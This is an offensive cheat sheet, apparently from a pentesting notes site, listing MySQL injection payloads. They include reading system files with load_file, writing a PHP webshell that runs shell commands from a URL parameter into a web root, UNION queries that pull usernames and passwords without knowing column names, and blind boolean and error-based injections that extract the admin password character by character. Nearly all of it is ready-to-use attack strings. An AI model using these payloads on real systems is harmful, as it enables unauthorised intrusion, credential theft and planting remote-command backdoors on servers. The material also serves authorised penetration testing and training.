---
description: Advanced MySQL Injection Exploitation
---

# MySQL

#### MySQL RCE:

MySQL doesn't have a procedure like MSSQL "xp\_cmdshell", but if we have the right privileges (read/write) we can try to read sensitive files or place a webshell.

{% code overflow="wrap" %}
```bash
#Read file:
select load_file('C:/Windows/System32/drivers/etc/hosts');

#Write file (webshell):
SELECT "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```
{% endcode %}

#### MySQL extract table data without knowing column names:

This type of query is useful when some words are banned (like "password").

{% code overflow="wrap" %}
```bash
#https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/
union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- - 
```
{% endcode %}

**MySQL retrieve multiple values in a single column**

This type of query is useful when a UNION attack has only 1 column that displays data.

```sql
SELECT NULL,CONCAT(username,password) FROM users-- -
SELECT NULL,username||'~'||password FROM users-- -
```

#### MySQL blind injection by triggering conditional responses

This type of query is useful when a blind attack is possible and the response changes when query is true or false.

<pre class="language-sql" data-overflow="wrap"><code class="lang-sql"><strong>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'admin'),1,1) = 's'-- -
</strong>
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='5-- -
</code></pre>

#### MySQL blind injection by triggering SQL errors

This type of query is useful when a blind attack is possible and the response does not change when query is true or false, but yes when there is a SQL error (like 1 divided by 0).

This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false.

```sql
#TRUE (1=1) will trigger a DB error
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
